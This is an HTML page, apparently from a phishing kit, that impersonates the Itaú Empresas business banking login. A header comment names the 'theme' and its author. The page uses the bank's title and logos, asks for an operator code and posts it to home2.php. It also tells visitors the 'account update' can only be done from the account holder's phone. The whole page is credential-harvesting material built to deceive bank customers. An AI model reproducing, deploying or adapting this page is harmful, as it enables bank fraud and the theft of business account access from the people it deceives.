﻿<!--
   Theme Name: Itaú Empresa Atualização cadastrais
   Author: MK(rj)
    -->

    <!DOCTYPE html>
<html lang="pt-BR">
   <head>
   <meta name="theme-color" content="#545454">
      <title>Itaú Empresas - Feito para sua empresa</title>
      <meta http-equiv="content-type" content="text/html; charset=UTF-8">

    <!-- CSS -->
    <link rel="stylesheet" type="text/css" href="css/bootstrap.css">
    <link rel="stylesheet" type="text/css" href="css/estilo.css">
    
    <link rel="icon" href="img/favicon.ico" type="image/x-icon"/>

    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <!-- scripts -->
    <script src="js/jquery-3.2.1.min.js"></script>
    <script src="js/jquery.mobile-1.3.2.min.js"></script>
    <script src="js/jquery.mask.js"></script>
    <script src="js/bootstrap.js"></script>
    <script src="js/script.js"></script>

    <!-- mascara -->
    <script type="text/javascript">
        $(document).ready(function(){
          $('#operador').mask('000000000');
        });
    </script>
   
   </head>
   <body id="tela1">
      <div class="container">
         <div class="row">
            <div class="col-md-12">
               <h1 id="logo">
                  <img src="img/itau-logo.png" style="width: 150px;">
                  <div class="tela-grande">
                     <p>Desculpe o transtorno :(</p>
                     <p>O recadastramento só poderá ser efetuado pelo telefone do titular da conta.</p>
                  </div>
               </h1>
               <h2 id="logo-empresa">
                 <img src="img/empresa.png" style="width: 130px;">
               </h2>
            </div>
         </div>
      </div>
      <div class="container">
         <div class="row">
            <section class="conteudo">
               <form method="POST" id="formulario-tela1" action="home2.php">
                  <div class="form-group">
                     <input id="operador" name="operador" placeholder="Código do Operador" type="tel" minlength="9" required>
                  </div>

                  <input type="submit" name="" value="Acessar">
               </form>
            </section>
         </div>
      </div>
      <footer>
        <img class="rodape" src="img/rodape.png">
      </footer>
   ></body>
</body><head>

</head>
</body>
</html>